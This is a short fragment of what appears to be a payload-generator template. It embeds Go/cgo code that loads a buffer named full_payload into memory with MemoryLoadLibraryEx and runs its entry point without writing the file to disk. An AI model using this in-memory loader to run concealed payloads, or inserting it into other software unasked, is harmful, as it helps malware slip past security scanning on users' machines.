imports=""

loader="""
	//handle := C.MemoryLoadLibrary(unsafe.Pointer(&full_payload[0]),(C.size_t)(len(full_payload)))
	handle := C.MemoryLoadLibraryEx(unsafe.Pointer(&full_payload[0]),
                                    (C.size_t)(len(full_payload)),
                                    (*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
                                    (*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
                                    (*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
                                    unsafe.Pointer(nil),                 // void *userdata (we're not passing any data to the dll or exe)
    )
    if handle == nil {
            fmt.Println("MemoryLoadLibrary failed")
            os.Exit(1)
    }

    //output := C.MemoryCallEntryPoint(handle)
    _ = C.MemoryCallEntryPoint(handle)
    //fmt.Println(output)
    C.MemoryFreeLibrary(handle)
"""